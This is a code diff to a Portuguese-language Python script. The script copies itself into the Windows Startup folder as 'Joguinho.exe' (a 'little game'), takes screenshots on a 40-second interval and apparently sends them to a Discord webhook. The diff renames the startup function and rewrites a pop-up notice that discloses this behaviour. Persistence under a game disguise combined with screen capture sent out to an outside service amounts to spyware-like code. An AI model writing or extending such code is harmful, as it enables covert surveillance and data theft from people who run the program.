@@ -12,15 +12,15 @@ import subprocess
 DC_WEBHOOK_URL = "URL DO DC AQUI"
 INTERVALO_SEGUNDOS = 40
 
-def add_to_startup():
+def adicionar_startup():
     app_path = sys.executable
     startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
     startup_exe = os.path.join(startup_folder, 'Joguinho.exe')
     
     if not os.path.exists(startup_exe):
         shutil.copy2(app_path, startup_exe)
-        
-add_to_startup()
+
+adicionar_startup()
 def enviar_print_para_discord():
     try:
         screenshot = pyautogui.screenshot()
@@ -48,7 +48,7 @@ def env1():
     toast = Notification(
         app_id="AVISO",
         title="AVISO",
-        msg="Esse .exe vai pro seu startup e tira print do seu pc, caso queira fazer isso parar de tirar print, va no seu gerinciador de arquivo e desligue ele no startup apps, ou simplesmente tire a parte do codigo onde coloca o .exe no startup"
+        msg="Atenção: Este .exe inicia com o sistema e tira prints da tela; para parar, desabilite-o no Gerenciador de Tarefas > Inicialização ou remova o trecho do código que configura a inicialização automática."
         )
     toast.set_audio(audio.Mail, loop=False)
     toast.add_actions(label="Clique Aqui para Fechar.")
